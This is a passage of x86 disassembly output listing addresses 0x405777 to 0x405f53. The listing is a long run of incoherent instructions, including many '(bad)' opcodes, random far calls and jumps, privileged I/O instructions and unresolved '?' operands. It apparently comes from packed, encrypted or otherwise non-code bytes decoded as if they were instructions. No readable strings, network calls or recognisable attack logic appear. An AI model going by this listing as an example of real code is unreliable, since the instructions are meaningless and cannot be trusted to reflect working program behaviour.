  405777:	imul   eax,DWORD PTR [edx],0x79
  40577a:	xchg   ecx,eax
  40577b:	or     al,0xdd
  40577d:	shl    DWORD PTR [edi],1
  40577f:	sar    BYTE PTR [eax],1
  405781:	pop    edx
  405782:	aam    0x86
  405784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405785:	sahf   
  405786:	sahf   
  405787:	enter  0xce44,0x2
  40578b:	add    al,ah
  40578d:	cmp    eax,0x18006010
  405792:	cdq    
  405793:	or     al,0x7f
  405795:	stos   BYTE PTR es:[edi],al
  405796:	stos   DWORD PTR es:[edi],eax
  405797:	je     0x40573e
  405799:	inc    esi
  40579a:	fcmovnbe st,st(2)
  40579c:	jne    0x405781
  40579e:	sub    al,0xd4
  4057a0:	stos   DWORD PTR es:[edi],eax
  4057a1:	call   0xe21a:0xb6605a83
  4057a8:	cmc    
  4057a9:	push   0xe50c0f59
  4057ae:	cmp    ch,BYTE PTR [edi-0x26]
  4057b1:	arpl   WORD PTR [eax+ebp*2+0x5fd5047a],bx
  4057b8:	fs dec esi
  4057ba:	pop    edi
  4057bb:	into   
  4057bc:	adc    cl,BYTE PTR [esi]
  4057be:	fs adc al,0xcf
  4057c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c2:	inc    ecx
  4057c3:	loop   0x405778
  4057c5:	in     eax,dx
  4057c6:	out    dx,eax
  4057c7:	call   0x9298:0x42a37977
  4057ce:	mov    ds:0x6b69c0fe,eax
  4057d3:	retf   
  4057d4:	lds    ecx,FWORD PTR [ebp+edx*8-0x4aa8b906]
  4057db:	(bad)  
  4057dc:	add    eax,0x7be03f4c
  4057e1:	cmc    
  4057e2:	imul   esp,DWORD PTR [ebx],0xffffff80
  4057e5:	(bad)  
  4057e6:	jmp    0x1bfa:0x284c0ff4
  4057ed:	push   es
  4057ee:	pop    esp
  4057ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f0:	dec    ebx
  4057f1:	xchg   edi,eax
  4057f2:	mov    cl,0x40
  4057f4:	mov    esi,0xf948b756
  4057f9:	xor    eax,DWORD PTR [edi+0x3b636569]
  4057ff:	test   al,0xcb
  405801:	pusha  
  405802:	jmp    0x405800
  405804:	adc    al,bh
  405806:	lods   al,BYTE PTR ds:[esi]
  405807:	or     ecx,DWORD PTR [edi+0x46]
  40580a:	pop    esi
  40580b:	iret   
  40580c:	and    DWORD PTR [edx-0x73baa82a],0x82031176
  405816:	add    eax,0xfc915e5c
  40581b:	ds or  al,0xa9
  40581e:	aas    
  40581f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405820:	int3   
  405821:	mov    dh,0xf0
  405823:	pop    ebx
  405824:	mov    edi,0xd174d829
  405829:	cmp    DWORD PTR [esi-0x49],0xfaecea73
  405830:	lods   eax,DWORD PTR ds:[esi]
  405831:	cdq    
  405832:	neg    DWORD PTR [ebx]
  405834:	dec    ebx
  405835:	jnp    0x4057bd
  405837:	(bad)  
  405838:	loop   0x4057d7
  40583a:	cwde   
  40583b:	das    
  40583c:	push   ebx
  40583d:	je     0x405879
  40583f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405840:	jbe    0x4057fd
  405842:	(bad)  
  405844:	push   cs
  405845:	mov    dh,0x40
  405847:	push   ebx
  405848:	pop    ecx
  405849:	and    DWORD PTR [edx],edi
  40584b:	sbb    BYTE PTR [ebx],bl
  40584d:	leave  
  40584e:	mov    WORD PTR [ebx+eiz*2-0x52],es
  405852:	xor    BYTE PTR [ecx-0x5c45b8a4],al
  405858:	mov    ds,WORD PTR cs:[edx]
  40585b:	jl     0x4057ec
  40585d:	pop    ss
  40585e:	mov    dl,0x16
  405860:	cs daa 
  405862:	(bad)  
  405863:	test   DWORD PTR [esi+0x56994f],0x94a0fe00
  40586d:	lahf   
  40586e:	inc    DWORD PTR [esp+esi*8]
  405871:	test   DWORD PTR [edx],esp
  405873:	pop    esp
  405874:	dec    eax
  405875:	(bad)  
  405876:	push   edi
  405877:	mov    WORD PTR [esi+0x3d1b8b48],fs
  40587d:	sub    eax,0x1057e09d
  405882:	jne    0x4058b4
  405884:	cld    
  405885:	shr    BYTE PTR [edx+0xa668bfb],0x98
  40588c:	xor    DWORD PTR [ebx+edx*2],edi
  40588f:	call   0xef2a3a51
  405894:	hlt    
  405895:	dec    eax
  405896:	sti    
  405897:	fs jl  0x405839
  40589a:	push   ecx
  40589b:	mov    ?,WORD PTR [edx]
  40589d:	out    dx,al
  40589e:	in     al,dx
  40589f:	mov    bh,BYTE PTR [ecx-0x64a9ce33]
  4058a5:	test   BYTE PTR [ecx],ch
  4058a7:	sub    BYTE PTR [ebp+0x6e],ch
  4058aa:	sbb    ah,BYTE PTR [esp+ebx*2]
  4058ad:	fucom  st(5)
  4058af:	jbe    0x40585b
  4058b1:	aam    0xd8
  4058b3:	cmp    BYTE PTR [edi],bl
  4058b5:	aad    0x15
  4058b7:	aad    0x28
  4058b9:	jo     0x405902
  4058bb:	pop    edx
  4058bc:	push   esi
  4058bd:	mov    bl,0x89
  4058bf:	xchg   esi,eax
  4058c0:	xchg   ah,cl
  4058c2:	test   al,0xda
  4058c4:	and    ebx,ebp
  4058c6:	push   ebx
  4058c7:	add    BYTE PTR [edi+0x60],dh
  4058ca:	sar    edi,0x1b
  4058cd:	popf   
  4058ce:	fsub   DWORD PTR [edx]
  4058d0:	aam    0xc9
  4058d2:	(bad)  
  4058d3:	daa    
  4058d4:	adc    BYTE PTR [eax+0x60cab530],ch
  4058da:	dec    edx
  4058db:	mov    ah,0x2b
  4058dd:	and    eax,0x76d7c7d7
  4058e2:	mov    bh,bl
  4058e4:	retf   
  4058e5:	dec    ebp
  4058e6:	int    0xb9
  4058e8:	adc    ebp,ebp
  4058ea:	popf   
  4058eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ec:	adc    BYTE PTR [ecx],al
  4058ee:	sub    dl,BYTE PTR [eax+0x28]
  4058f1:	call   0xf217:0x2c281bba
  4058f8:	jo     0x4058b2
  4058fa:	enter  0x4cc0,0xc5
  4058fe:	mov    ebp,0x23bbd1af
  405903:	shr    BYTE PTR [edi+0xb],1
  405906:	or     edi,DWORD PTR [ecx-0x4dba4650]
  40590c:	jmp    0xa18cfa95
  405911:	test   al,0x91
  405913:	(bad)  
  405914:	or     eax,0x60e3644e
  405919:	fmul   QWORD PTR [esi-0x2c]
  40591c:	mov    bl,0x15
  40591e:	mov    bh,0x17
  405920:	dec    esp
  405921:	(bad)  
  405923:	sub    esp,DWORD PTR [edi+0x40465ab8]
  405929:	mov    ds:0x817f8235,eax
  40592e:	sahf   
  40592f:	push   ebx
  405930:	xchg   ecx,eax
  405931:	ins    DWORD PTR es:[edi],dx
  405932:	leave  
  405933:	push   ecx
  405934:	xchg   esp,eax
  405935:	loope  0x405956
  405937:	pop    ds
  405938:	ret    
  405939:	push   ss
  40593a:	xor    al,0x82
  40593c:	inc    ebx
  40593d:	lods   eax,DWORD PTR ds:[esi]
  40593e:	fild   WORD PTR [eax+0x45]
  405941:	dec    ebx
  405942:	adc    eax,0x86317f62
  405947:	std    
  405948:	loopne 0x4058e1
  40594a:	ret    
  40594b:	imul   ebx,DWORD PTR [ebp-0x47],0xffffffc1
  40594f:	out    0xa0,al
  405951:	push   esp
  405952:	sbb    al,0xb7
  405954:	test   DWORD PTR [ebx-0x6c],ebp
  405957:	and    DWORD PTR [ebp-0x52be7672],edx
  40595d:	xchg   edx,eax
  40595e:	sbb    ebp,eax
  405960:	fnsave [ecx-0x9297ae3]
  405966:	js     0x40599b
  405968:	mov    ds:0x2c1116a6,al
  40596d:	stos   BYTE PTR es:[edi],al
  40596e:	xlat   BYTE PTR ds:[ebx]
  40596f:	fwait
  405970:	mov    bl,BYTE PTR [ebx+ebx*8+0x18]
  405974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405975:	adc    dh,cl
  405977:	shl    DWORD PTR [esi],1
  405979:	xchg   ebp,eax
  40597a:	and    DWORD PTR ds:0x22288f1f,0xde09af95
  405984:	mov    dh,0x30
  405986:	(bad)  
  405987:	xor    eax,0xdb379559
  40598c:	sub    eax,0x68f8a8bf
  405991:	inc    edx
  405992:	ficomp DWORD PTR [eax-0x485d0266]
  405998:	jl     0x40595a
  40599a:	pop    esp
  40599b:	call   FWORD PTR [edx+0x2a4b92e4]
  4059a1:	ins    BYTE PTR es:[edi],dx
  4059a2:	add    al,0x96
  4059a4:	mov    dh,0xd9
  4059a6:	mov    esp,0x149f44dc
  4059ab:	sub    eax,0x24e584cc
  4059b0:	aad    0x5a
  4059b2:	out    dx,al
  4059b3:	icebp  
  4059b4:	pop    ds
  4059b5:	adc    al,0x7
  4059b7:	bound  ebx,QWORD PTR ds:0xb7dd8922
  4059bd:	add    esi,DWORD PTR [edi+esi*4]
  4059c0:	pop    edx
  4059c1:	mov    ds:0xfa1d74e4,eax
  4059c6:	out    dx,eax
  4059c7:	xor    dh,BYTE PTR [esi-0x68]
  4059ca:	inc    ecx
  4059cb:	ret    0x7975
  4059ce:	push   cs
  4059cf:	stos   DWORD PTR es:[edi],eax
  4059d0:	jmp    0xb1cf0427
  4059d5:	imul   BYTE PTR [esi-0x180951b7]
  4059db:	push   cs
  4059dc:	adc    bh,BYTE PTR [ecx]
  4059de:	mov    eax,0x90b7f173
  4059e3:	inc    esp
  4059e4:	gs jnp 0x40599a
  4059e7:	outs   dx,DWORD PTR ds:[esi]
  4059e8:	std    
  4059e9:	test   WORD PTR [eax],cx
  4059ec:	adc    eax,0xbd2ec32e
  4059f1:	sahf   
  4059f2:	pop    ss
  4059f3:	mov    bl,0xc6
  4059f5:	(bad)  
  4059f6:	xor    eax,0xc35e81a1
  4059fb:	inc    ebx
  4059fc:	mov    bl,0xb9
  4059fe:	xor    BYTE PTR [esi+0x34467821],0xb
  405a05:	pop    edx
  405a06:	mul    DWORD PTR [ecx]
  405a08:	adc    dl,BYTE PTR [edx-0x6f8e1749]
  405a0e:	xor    al,0x59
  405a10:	call   0x9ced:0xc1f9861b
  405a17:	into   
  405a18:	outs   dx,BYTE PTR ds:[esi]
  405a19:	jns    0x405a4e
  405a1b:	lahf   
  405a1c:	pusha  
  405a1d:	cmc    
  405a1e:	mov    BYTE PTR [edi],bh
  405a20:	in     al,dx
  405a21:	sar    BYTE PTR [eax-0x3628ca18],0x69
  405a28:	jle    0x405a6a
  405a2a:	jmp    0x65dd:0xa8d27186
  405a31:	leave  
  405a32:	inc    esi
  405a33:	mov    bl,0xde
  405a35:	aas    
  405a36:	and    ch,cl
  405a38:	jno    0x405aa0
  405a3a:	jmp    0x405a46
  405a3c:	aam    0x22
  405a3e:	mov    ebp,gs
  405a40:	dec    BYTE PTR [ebp+esi*2+0x67]
  405a44:	sbb    ch,BYTE PTR [edx+0x1dcac8ac]
  405a4a:	inc    ebp
  405a4b:	xchg   bl,bl
  405a4d:	add    ch,BYTE PTR [edx-0x480766ab]
  405a53:	pusha  
  405a54:	scas   al,BYTE PTR es:[edi]
  405a55:	push   esp
  405a56:	test   eax,0x8201bacd
  405a5b:	pop    edi
  405a5c:	xchg   ecx,eax
  405a5d:	mov    al,ds:0x14699f7c
  405a62:	ret    
  405a63:	ffree  st(5)
  405a65:	add    ecx,ebx
  405a67:	pop    ds
  405a68:	cwde   
  405a69:	out    0xc4,eax
  405a6b:	repz mov eax,0x395c5909
  405a71:	icebp  
  405a72:	sahf   
  405a73:	repnz neg BYTE PTR [edx]
  405a76:	in     al,0xcd
  405a78:	add    edx,DWORD PTR [edi]
  405a7a:	xlat   BYTE PTR ds:[ebx]
  405a7b:	rcl    ebp,1
  405a7d:	or     DWORD PTR [edi+edi*2-0x2c],ebx
  405a81:	mov    ecx,0x282d00ec
  405a86:	lea    ecx,[ecx+0x11]
  405a89:	int    0x83
  405a8b:	gs ds push ebx
  405a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a8f:	jbe    0x405a61
  405a91:	sahf   
  405a92:	gs scas al,BYTE PTR es:[edi]
  405a94:	adc    BYTE PTR [edi],dh
  405a96:	mov    ?,WORD PTR [ecx]
  405a98:	bnd addr16 ja 0x405af6
  405a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a9d:	push   esp
  405a9e:	push   ss
  405a9f:	aam    0xc6
  405aa1:	or     al,0xcc
  405aa3:	aaa    
  405aa4:	outs   dx,DWORD PTR ds:[esi]
  405aa5:	nop
  405aa6:	ficomp WORD PTR [ecx-0x56]
  405aa9:	xchg   DWORD PTR [edi+eax*1+0x649d5ba8],eax
  405ab0:	pop    ds
  405ab1:	stos   DWORD PTR es:[edi],eax
  405ab2:	lods   eax,DWORD PTR ds:[esi]
  405ab3:	xchg   edx,eax
  405ab4:	xor    DWORD PTR [edi+0x29585055],esi
  405aba:	shr    DWORD PTR ds:0xb03f4e8a,cl
  405ac0:	das    
  405ac1:	push   ebx
  405ac2:	and    DWORD PTR [edi],ebx
  405ac4:	xchg   ebx,eax
  405ac5:	cmp    eax,0x9176c4c3
  405aca:	outs   dx,BYTE PTR ds:[esi]
  405acb:	jge    0x405ae4
  405acd:	mov    al,ds:0xc754c679
  405ad2:	ds popa 
  405ad4:	xor    al,0x72
  405ad6:	test   DWORD PTR [edx-0x59a031a3],edx
  405adc:	sbb    ah,BYTE PTR [ecx-0x421cb762]
  405ae2:	loope  0x405b3f
  405ae4:	out    dx,al
  405ae5:	sldt   WORD PTR [edi+0x6f]
  405ae9:	push   ss
  405aea:	mov    edx,0x89453a2
  405aef:	shr    BYTE PTR [edx+0x6d],cl
  405af2:	ins    DWORD PTR es:[edi],dx
  405af3:	les    esp,FWORD PTR [eax]
  405af5:	fldcw  WORD PTR [esi-0x7a1e6665]
  405afb:	fs pop ebx
  405afd:	xchg   esp,eax
  405afe:	push   edi
  405aff:	out    0x7a,al
  405b01:	jo     0x405add
  405b03:	xchg   BYTE PTR ss:[eax+edi*8+0x7b4ff0c9],al
  405b0b:	add    edi,DWORD PTR [ebp-0x4c]
  405b0e:	dec    DWORD PTR [edi-0x4]
  405b11:	pop    esi
  405b12:	arpl   dx,sp
  405b14:	mov    al,ds:0x8b163cb4
  405b19:	mov    cl,0x5f
  405b1b:	adc    eax,0x5823db7f
  405b20:	jecxz  0x405ac3
  405b22:	icebp  
  405b23:	xlat   BYTE PTR ds:[ebx]
  405b24:	sets   BYTE PTR [eax+0x7c56c107]
  405b2b:	out    dx,al
  405b2c:	sub    eax,0x5dad4aac
  405b31:	add    eax,0xcb5179a5
  405b36:	and    DWORD PTR [ebx+0x4800809c],ebx
  405b3c:	call   0xa370:0xaaa67d7d
  405b43:	mov    ch,0xeb
  405b45:	test   DWORD PTR [esi],0xe86254
  405b4b:	cld    
  405b4c:	sub    BYTE PTR [eax-0x7f16b261],0x88
  405b53:	retf   0x218f
  405b56:	push   esi
  405b57:	or     BYTE PTR [edi+esi*2-0x54],ah
  405b5b:	jmp    0x377e:0x4f3ae649
  405b62:	imul   ebx,DWORD PTR [ecx],0x85352a29
  405b68:	(bad)  
  405b69:	cmp    al,0xf7
  405b6b:	addr16 mov esp,0x1573999b
  405b71:	sub    ebp,ebx
  405b73:	mov    ebp,es
  405b75:	inc    eax
  405b76:	jecxz  0x405b81
  405b78:	shr    DWORD PTR [ebx-0x49470a21],1
  405b7e:	loop   0x405bd5
  405b80:	lods   al,BYTE PTR ds:[esi]
  405b81:	sbb    eax,0x658b582d
  405b86:	pop    ss
  405b87:	(bad)  
  405b88:	jmp    0xa6d31952
  405b8d:	mov    eax,0x5ce1b4be
  405b92:	inc    ebx
  405b93:	push   ds
  405b94:	in     al,0x32
  405b96:	or     esi,ebp
  405b98:	ja     0x405c02
  405b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9b:	dec    ecx
  405b9c:	cmp    BYTE PTR [ebp+0x412e8c54],bl
  405ba2:	fnsave [eax+0x7c]
  405ba5:	(bad)  
  405ba6:	mov    ch,0x77
  405ba8:	mov    ebp,0x66d4877b
  405bad:	pop    esp
  405bae:	mov    bl,0xe9
  405bb0:	fs pop ds
  405bb2:	fwait
  405bb3:	xchg   ecx,eax
  405bb4:	mov    edi,0xf5a7390f
  405bb9:	xchg   esi,eax
  405bba:	xchg   esi,eax
  405bbb:	push   ss
  405bbc:	add    BYTE PTR [ebx],cl
  405bbe:	ins    BYTE PTR es:[edi],dx
  405bbf:	imul   al
  405bc1:	jg     0x405b88
  405bc3:	mov    eax,esi
  405bc5:	dec    ebp
  405bc6:	in     al,0x6c
  405bc8:	jbe    0x405b5f
  405bca:	std    
  405bcb:	adc    ch,0x87
  405bce:	loop   0x405c08
  405bd0:	enter  0xf874,0xb3
  405bd4:	cld    
  405bd5:	dec    esp
  405bd6:	adc    eax,DWORD PTR [edx+edx*4+0x5c]
  405bda:	aam    0xc6
  405bdc:	mov    ebp,0xd2afd94c
  405be1:	mov    dl,0xa6
  405be3:	aad    0xac
  405be5:	jp     0x405b6f
  405be7:	inc    eax
  405be8:	xor    al,0xf4
  405bea:	cdq    
  405beb:	pop    esp
  405bec:	cmc    
  405bed:	rol    edi,cl
  405bef:	retf   
  405bf0:	mov    dl,0x65
  405bf2:	cmp    BYTE PTR [esi+eax*4+0x4bcd4eae],0x8e
  405bfa:	sbb    eax,0x390f66a6
  405bff:	(bad)  [edi]
  405c01:	sub    al,0x39
  405c03:	int    0xaf
  405c05:	xchg   DWORD PTR [ecx-0x64],esp
  405c08:	sub    BYTE PTR [ebp+0x20564029],0xa5
  405c0f:	addr16 imul dl
  405c12:	cmp    al,0xbf
  405c14:	fs sbb eax,0xcd6a5b78
  405c1a:	adc    ebx,DWORD PTR ds:0xcf46b25a
  405c20:	mov    dl,0xdd
  405c22:	test   DWORD PTR [eax+edi*2+0x69d41ef9],eax
  405c29:	(bad)  
  405c2a:	int3   
  405c2b:	mov    gs,WORD PTR [esp+eax*8-0x11d81a31]
  405c32:	ds hlt 
  405c34:	pop    ebx
  405c35:	jno    0x405bd4
  405c37:	xchg   ecx,eax
  405c38:	add    al,0xc2
  405c3a:	lods   al,BYTE PTR ds:[esi]
  405c3c:	sub    esp,ebp
  405c3e:	and    DWORD PTR [ebx+ebx*8-0x80],esi
  405c42:	test   eax,0x79ddfe78
  405c47:	or     DWORD PTR [edi],0x17
  405c4a:	mov    bl,0x6a
  405c4c:	inc    DWORD PTR [eax+esi*4-0x71]
  405c50:	pop    eax
  405c51:	push   esi
  405c52:	fs ret 
  405c54:	into   
  405c55:	in     al,0x31
  405c57:	cmp    DWORD PTR [edi-0x41],esp
  405c5a:	into   
  405c5b:	stos   BYTE PTR es:[edi],al
  405c5c:	mov    bh,0x8e
  405c5e:	popa   
  405c5f:	aam    0xb3
  405c61:	mov    dh,0x10
  405c63:	arpl   bp,sp
  405c65:	test   DWORD PTR [esi+0x4e6243f5],0xe6f09928
  405c6f:	add    esi,DWORD PTR [ebx-0x55]
  405c72:	or     al,0x74
  405c74:	iret   
  405c75:	enter  0x45b3,0xbd
  405c79:	sbb    ebx,DWORD PTR [esi]
  405c7b:	mov    al,0xe1
  405c7d:	das    
  405c7e:	jle    0x405c7b
  405c80:	pop    ecx
  405c81:	je     0x405c73
  405c83:	call   DWORD PTR [eax-0x3b320d8]
  405c89:	mov    eax,0x44a61e90
  405c8e:	pop    ecx
  405c8f:	aad    0xaa
  405c91:	test   eax,0xc7d3efc7
  405c96:	mov    eax,0x4965a4ba
  405c9b:	icebp  
  405c9c:	cli    
  405c9d:	jle    0x405cae
  405c9f:	popa   
  405ca0:	mov    dl,0xf7
  405ca2:	(bad)  
  405ca3:	cmp    al,0x18
  405ca5:	lahf   
  405ca6:	cmp    al,0x1e
  405ca8:	or     BYTE PTR [edi],dl
  405caa:	push   0xf7837d4a
  405caf:	jmp    0x405c7a
  405cb1:	cli    
  405cb2:	xchg   ebp,eax
  405cb3:	shl    BYTE PTR [edi+0x58],1
  405cb6:	cmp    BYTE PTR [esp+ecx*4+0x19],al
  405cba:	dec    ebp
  405cbb:	add    eax,0x24017100
  405cc0:	sub    cl,BYTE PTR [ecx]
  405cc2:	test   eax,0x59e7be9
  405cc7:	sahf   
  405cc8:	(bad)  
  405cc9:	fld    TBYTE PTR [esi]
  405ccb:	out    dx,al
  405ccc:	addr16 das 
  405cce:	wbinvd 
  405cd0:	test   eax,0x33fe4095
  405cd5:	int    0xd5
  405cd7:	sbb    eax,0xbf7c4701
  405cdc:	retf   
  405cdd:	fist   DWORD PTR [eax+0x6f]
  405ce0:	out    dx,eax
  405ce1:	or     BYTE PTR [eax],ch
  405ce3:	inc    edx
  405ce4:	scas   eax,DWORD PTR es:[edi]
  405ce5:	(bad)  
  405ce6:	imul   edi,DWORD PTR [edi+0x5c],0x9b8d0809
  405ced:	imul   ecx,DWORD PTR ds:0x7ca491ed,0xe6322ea8
  405cf7:	cmp    eax,0x87855057
  405cfc:	shl    BYTE PTR [esi-0x702e6102],1
  405d02:	das    
  405d03:	push   0x257a1f98
  405d08:	cmp    bl,BYTE PTR [ebp+0x50c204fa]
  405d0e:	sti    
  405d0f:	mov    dl,0x6e
  405d11:	cmp    eax,0xe0b8b7ef
  405d16:	adc    DWORD PTR [edx+edi*4],ebx
  405d19:	les    edi,FWORD PTR [eax]
  405d1b:	pushf  
  405d1c:	cmp    dl,bl
  405d1e:	push   esi
  405d1f:	sar    DWORD PTR [ebp-0x6ab476ad],0xd2
  405d26:	hlt    
  405d27:	cmp    ebx,DWORD PTR [edi+0x3a]
  405d2a:	lea    ebx,[esi]
  405d2c:	adc    al,0xcd
  405d2e:	dec    esp
  405d2f:	mov    fs,WORD PTR [ebx]
  405d31:	fisttp WORD PTR [si+0x6459]
  405d36:	pop    esi
  405d37:	cmp    edx,DWORD PTR [eax]
  405d39:	sub    ah,BYTE PTR [edx+ecx*2-0x6c36157c]
  405d40:	fimul  WORD PTR [edx+0xc]
  405d43:	arpl   WORD PTR [ecx-0x6ebea91f],cx
  405d49:	jns    0x405d64
  405d4b:	cdq    
  405d4c:	push   ebp
  405d4d:	sub    DWORD PTR [edi],0xc20f71ad
  405d53:	mov    WORD PTR [esi],?
  405d55:	retf   0x3319
  405d58:	add    edx,DWORD PTR [ebp+0x36]
  405d5b:	clc    
  405d5c:	add    al,0x9f
  405d5e:	and    BYTE PTR [ebx-0x36],0xa9
  405d62:	lds    esi,FWORD PTR ds:0xdb02016d
  405d68:	(bad)  [edx-0x4594ccea]
  405d6e:	dec    esp
  405d6f:	inc    ebx
  405d70:	scas   al,BYTE PTR es:[edi]
  405d71:	lods   al,BYTE PTR ds:[esi]
  405d72:	inc    edi
  405d73:	lea    esi,[esi-0x5c]
  405d76:	jp     0x405dcb
  405d78:	pushf  
  405d79:	es xchg ebp,eax
  405d7b:	push   cs
  405d7c:	loope  0x405dd2
  405d7e:	out    dx,eax
  405d7f:	push   0xe
  405d81:	adc    esi,edx
  405d83:	adc    dl,BYTE PTR [edi+0x13511ada]
  405d89:	or     ebx,DWORD PTR [edi+0x6ac36c09]
  405d8f:	mov    ebp,0x4bb39cc2
  405d94:	mov    bl,0x68
  405d96:	and    eax,0x63c32a3b
  405d9b:	out    dx,al
  405d9c:	adc    edx,DWORD PTR [esi+0x6e71abad]
  405da2:	xchg   ebp,eax
  405da3:	inc    eax
  405da4:	stos   BYTE PTR es:[edi],al
  405da5:	mov    bh,0x9b
  405da7:	outs   dx,BYTE PTR ds:[esi]
  405da8:	xchg   esi,eax
  405da9:	aam    0xea
  405dab:	mov    esp,0xdb6c992a
  405db0:	test   BYTE PTR [edx-0x7c],bh
  405db3:	pop    es
  405db4:	shl    DWORD PTR [ebp+0x7e],1
  405db7:	test   eax,0x34e480ec
  405dbc:	bound  esp,QWORD PTR [ebx-0x32]
  405dbf:	jge    0x405da7
  405dc1:	das    
  405dc2:	lea    edx,[ebp-0x194905f6]
  405dc8:	xlat   BYTE PTR ds:[ebx]
  405dc9:	fidiv  DWORD PTR [ebp+0x42]
  405dcc:	push   esi
  405dcd:	call   0xb3b5:0x669362c5
  405dd4:	aam    0x5c
  405dd6:	aad    0xe
  405dd8:	int3   
  405dd9:	mov    DWORD PTR [edx-0x71],ebx
  405ddc:	push   0x6e
  405dde:	add    eax,0x31eb62
  405de3:	cwde   
  405de4:	cdq    
  405de5:	shl    BYTE PTR [ecx-0x70],0xa8
  405de9:	inc    eax
  405dea:	shl    esi,1
  405dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ded:	(bad)  [ebp-0x766e8933]
  405df3:	in     al,0xb4
  405df5:	jno    0x405e62
  405df7:	dec    sp
  405df9:	(bad)  
  405dfa:	xchg   esp,eax
  405dfb:	mov    eax,0x47f2c2f9
  405e00:	bound  ecx,QWORD PTR [edx-0x1b]
  405e03:	and    al,0xdc
  405e05:	fisubr WORD PTR [edx-0x3]
  405e08:	cmp    edi,0x4
  405e0b:	sbb    dh,cl
  405e0d:	ds test eax,0x980fa45b
  405e13:	xchg   edi,eax
  405e14:	scas   al,BYTE PTR es:[edi]
  405e15:	addr16 mov dh,0xe7
  405e18:	jmp    0x6e649200
  405e1d:	xchg   esp,eax
  405e1e:	dec    esi
  405e1f:	inc    ecx
  405e20:	mov    edi,0xd09d1e63
  405e25:	dec    edi
  405e26:	inc    esp
  405e27:	in     eax,0x9e
  405e29:	sub    al,0xd3
  405e2b:	xchg   BYTE PTR [esi],al
  405e2d:	clc    
  405e2e:	rcr    BYTE PTR [eax-0x5],1
  405e31:	or     al,BYTE PTR [edx+eiz*2]
  405e34:	jl     0x405e50
  405e36:	adc    DWORD PTR ds:0x374d4894,ebx
  405e3c:	mov    ecx,0x4b4d29ae
  405e41:	inc    ebx
  405e42:	push   ds
  405e43:	mov    al,ds:0x616849b3
  405e48:	call   0xcc19:0xd79f8d2c
  405e4f:	jle    0x405e3c
  405e51:	mov    ds:0x70327e30,eax
  405e56:	and    bl,BYTE PTR [edx-0x7d]
  405e59:	xchg   esi,eax
  405e5a:	std    
  405e5b:	cmp    DWORD PTR [eax-0x70b1393a],edi
  405e61:	(bad)  
  405e62:	dec    bh
  405e64:	jle    0x405e0b
  405e66:	cmc    
  405e67:	(bad)  
  405e69:	cmp    eax,0x4a5a495a
  405e6e:	mov    bh,0x1b
  405e70:	and    edi,DWORD PTR [eax-0x1ba66380]
  405e76:	loope  0x405ee9
  405e78:	pop    edx
  405e79:	push   cs
  405e7a:	cmp    ah,dh
  405e7c:	add    DWORD PTR [ebp-0x152330e5],ecx
  405e82:	pushf  
  405e83:	les    eax,FWORD PTR [ebx]
  405e85:	lock xchg esi,eax
  405e87:	(bad)  
  405e89:	shl    BYTE PTR [eax+ebp*2+0x62],0xa5
  405e8e:	icebp  
  405e8f:	push   edi
  405e90:	mov    eax,0x78b0dc77
  405e95:	retf   
  405e96:	dec    ebx
  405e97:	fistp  WORD PTR [esi+0x2f0cfec0]
  405e9d:	(bad)  
  405e9e:	pop    eax
  405e9f:	add    ebp,DWORD PTR [edi+esi*8+0x1e]
  405ea3:	stc    
  405ea4:	imul   ebx,DWORD PTR [ebx],0xa8b41fbf
  405eaa:	popf   
  405eab:	adc    al,0xf4
  405ead:	jle    0x405f15
  405eaf:	ss inc esi
  405eb1:	test   eax,0xfe751057
  405eb6:	pushf  
  405eb7:	mov    ah,0xa1
  405eb9:	lahf   
  405eba:	pop    esp
  405ebb:	imul   edx,DWORD PTR [ebx+0x22],0xffffff9e
  405ebf:	mov    ebx,0xec8c3054
  405ec4:	data16 lahf 
  405ec6:	pop    ss
  405ec7:	mov    ah,0xb3
  405ec9:	dec    edi
  405eca:	dec    ebx
  405ecb:	mov    al,ds:0xee422988
  405ed0:	jae    0x405ec8
  405ed2:	scas   eax,DWORD PTR es:[edi]
  405ed3:	pop    ds
  405ed4:	sbb    bl,BYTE PTR [ebp+0x34db4a54]
  405eda:	jae    0x405e86
  405edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405edd:	jne    0x405ea4
  405edf:	loopne 0x405ebb
  405ee1:	pop    es
  405ee2:	jbe    0x405ec1
  405ee4:	xchg   edi,eax
  405ee5:	sbb    esi,DWORD PTR [edi]
  405ee7:	push   cs
  405ee8:	push   ss
  405ee9:	fstp   TBYTE PTR [eax]
  405eeb:	inc    esi
  405eec:	fidiv  WORD PTR [ecx+0x28495688]
  405ef2:	dec    edi
  405ef3:	mov    DWORD PTR [esi-0x3a],ebp
  405ef6:	retf   0x9d0a
  405ef9:	mov    dh,0x53
  405efb:	cmp    BYTE PTR [edi-0x109a7c7c],0xfc
  405f02:	and    al,BYTE PTR [eax+0x6a]
  405f05:	loop   0x405f7b
  405f07:	or     DWORD PTR [edx+0xce47048],ebx
  405f0d:	outs   dx,DWORD PTR ds:[esi]
  405f0e:	mov    cl,0xae
  405f10:	xchg   esp,eax
  405f11:	repnz or ch,al
  405f14:	int    0x58
  405f16:	jno    0x405f45
  405f18:	(bad)  
  405f19:	call   0x56a1:0xead2e683
  405f20:	stos   BYTE PTR es:[edi],al
  405f21:	imul   esi,esp,0xffffffe2
  405f24:	mov    esi,0x7b99d16b
  405f29:	lock xor eax,0x2cc74154
  405f2f:	test   DWORD PTR [edi+0x38],0xbf55266e
  405f36:	sbb    al,BYTE PTR [edi+0x2fe7969b]
  405f3c:	push   ds
  405f3d:	hlt    
  405f3e:	in     eax,dx
  405f3f:	(bad)  
  405f40:	in     al,dx
  405f41:	jo     0x405f12
  405f43:	sub    BYTE PTR [edi-0x6415c3af],dh
  405f49:	adc    ebp,DWORD PTR [esi+eax*8+0x388185dc]
  405f50:	popa   
  405f51:	cs pop esp
  405f53:	shl    BYTE PTR [esi+0x4b],cl
